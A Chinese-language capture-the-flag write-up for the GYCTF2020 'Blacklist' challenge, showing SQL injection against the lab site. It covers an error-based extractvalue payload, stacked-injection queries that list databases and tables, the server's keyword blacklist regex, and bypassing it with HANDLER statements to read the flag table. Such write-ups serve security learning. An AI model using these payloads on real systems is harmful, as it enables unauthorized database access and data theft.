# [GYCTF2020]Blacklist

## 一、题目信息

1. 经测试发现可能是SQL注入

![image-20211020183238631](https://i.loli.net/2021/10/20/K94NMPkOI81nx2D.png)



## 二、注入测试

1. 构造闭合

![image-20211020183553929](https://i.loli.net/2021/10/20/AMFlvfEmJkwWz1s.png)



2. 得到三条数据

```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}
array(2) {
  [0]=>
  string(6) "114514"
  [1]=>
  string(2) "ys"
}
```



3. 测试返回黑名单列表

```php
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```



4. 使用**xpath 报错注入**获取数据

```
/
?inject=1' and extractvalue(0x0a,concat(0x7e,(database()),0x7e)) and '1

user: root@localhost
version: 10.3.18-MariaDB
database: supersqli
```

![image-20211020185015766](https://i.loli.net/2021/10/20/BLm1hts53PWZNal.png)



5. 测试发现可以进行堆叠注入



6. 获取所有数据库名

```sql
/?inject=-1';show databases;
```

![image-20211020191502448](https://i.loli.net/2021/10/20/Z9jMmV76bIncu4W.png)

```
ctftraining
information_schema
mysql
performance_schema
test
supersqli
```





7. 获取所有表名

```SQL
/?inject=1';show+tables;
```

![image-20211020185706882](https://i.loli.net/2021/10/20/umZzrlXNBPDLhaH.png)

得到：

```
FlagHere
words
```



9. 查询表结构

```sql
/?inject=-1';show create table FlagHere;
/?inject=-1';show create table words;
```

![image-20211020194001518](https://i.loli.net/2021/10/20/r1EluZo2VTnfCp9.png)

![image-20211020194345422](https://i.loli.net/2021/10/20/SC1ORcLdGv5BsZE.png)



## 三、解题思路

使用HANDLER语句读取数据

![image-20211020194857417](https://i.loli.net/2021/10/20/wHmJBifIL31hOFg.png)

Get Flag！



### HANDLER语句解释

```html
handler ... open      #打开一个表
handler ... read      #访问表内容，在调用close前是不会关闭的
handler ... close     #关闭会话
```



